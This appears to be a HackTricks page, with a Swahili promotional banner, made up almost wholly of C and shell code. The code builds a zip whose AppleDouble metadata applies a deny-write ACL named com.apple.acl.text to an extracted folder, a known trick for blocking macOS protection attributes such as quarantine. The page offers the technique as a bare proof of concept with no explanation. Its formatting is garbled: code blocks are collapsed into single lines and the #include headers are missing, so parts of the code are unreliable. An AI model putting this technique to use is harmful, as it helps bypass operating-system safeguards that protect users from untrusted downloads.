# macOS xattr-acls extra stuff

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

\`\`\`bash rm -rf /tmp/test\* echo test >/tmp/test chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test ./get\_acls test ACL for test: !#acl 1 group:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:deny:write,writeattr,writeextattr,writesecurity,chown

ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a

````
<details>

<summary>Kificho cha get_acls</summary>
```c
// gcc -o get_acls get_acls
#include <stdio.h>
#include <stdlib.h>
#include <sys/acl.h>

int main(int argc, char *argv[]) {
if (argc != 2) {
fprintf(stderr, "Usage: %s <filepath>\n", argv[0]);
return 1;
}

const char *filepath = argv[1];
acl_t acl = acl_get_file(filepath, ACL_TYPE_EXTENDED);
if (acl == NULL) {
perror("acl_get_file");
return 1;
}

char *acl_text = acl_to_text(acl, NULL);
if (acl_text == NULL) {
perror("acl_to_text");
acl_free(acl);
return 1;
}

printf("ACL for %s:\n%s\n", filepath, acl_text);

// Convert acl_text to hexadecimal and print it
printf("ACL in hex: ");
for (char *c = acl_text; *c != '\0'; c++) {
printf("\\x%02x", (unsigned char)*c);
}
printf("\n");

acl_free(acl);
acl_free(acl_text);
return 0;
}
````

\`\`\`bash # Lets add the xattr com.apple.xxx.xxxx with the acls mkdir start mkdir start/protected ./set\_xattr start/protected echo something > start/protected/something \`\`\`

<details>

<summary>Kodi ya set_xattr</summary>

\`\`\`c // gcc -o set\_xattr set\_xattr.c #include #include #include #include #include

void print\_xattrs(const char \*filepath) { ssize\_t buflen = listxattr(filepath, NULL, 0, XATTR\_NOFOLLOW); if (buflen < 0) { perror("listxattr"); return; }

char \*buf = malloc(buflen); if (buf == NULL) { perror("malloc"); return; }

buflen = listxattr(filepath, buf, buflen, XATTR\_NOFOLLOW); if (buflen < 0) { perror("listxattr"); free(buf); return; }

printf("All current extended attributes for %s:\n", filepath); for (char \*name = buf; name < buf + buflen; name += strlen(name) + 1) { printf("%s: ", name); ssize\_t valuelen = getxattr(filepath, name, NULL, 0, 0, XATTR\_NOFOLLOW); if (valuelen < 0) { perror("getxattr"); continue; }

char \*value = malloc(valuelen + 1); if (value == NULL) { perror("malloc"); continue; }

valuelen = getxattr(filepath, name, value, valuelen, 0, XATTR\_NOFOLLOW); if (valuelen < 0) { perror("getxattr"); free(value); continue; }

value\[valuelen] = '\0'; // Null-terminate the value printf("%s\n", value); free(value); }

free(buf); }

int main(int argc, char \*argv\[]) { if (argc != 2) { fprintf(stderr, "Usage: %s \n", argv\[0]); return 1; }

const char \*hex = "\x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43\x44\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x2d\x41\x42\x43\x44\x2d\x45\x46\x41\x42\x2d\x43\x44\x45\x46\x30\x30\x30\x30\x30\x30\x30\x43\x3a\x65\x76\x65\x72\x79\x6f\x6e\x65\x3a\x31\x32\x3a\x64\x65\x6e\x79\x3a\x77\x72\x69\x74\x65\x2c\x77\x72\x69\x74\x65\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x65\x78\x74\x61\x74\x74\x72\x2c\x77\x72\x69\x74\x65\x73\x65\x63\x75\x72\x69\x74\x79\x2c\x63\x68\x6f\x77\x6e\x0a"; const char \*filepath = argv\[1];

int result = setxattr(filepath, "com.apple.xxx.xxxx", hex, strlen(hex), 0, 0); if (result == 0) { printf("Extended attribute set successfully.\n\n"); } else { perror("setxattr"); return 1; }

print\_xattrs(filepath);

return 0; }

````
</details>

<div data-gb-custom-block data-tag="code" data-overflow='wrap'>

```bash
# Create appledoublefile with the xattr entitlement
ditto -c -k start protected.zip
rm -rf start
# extract the files
unzip protected.zip
# Replace the name of the xattr here (if you put it before ditto would have destroyed it)
python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
# zip everything back together
rm -rf protected.zip
zip -r protected.zip protected ._protected
rm -rf protected
rm ._*
````

\`\`\`bash # Check if it worked ditto -x -k --rsrc protected.zip . xattr -l protected \`\`\`



</details>
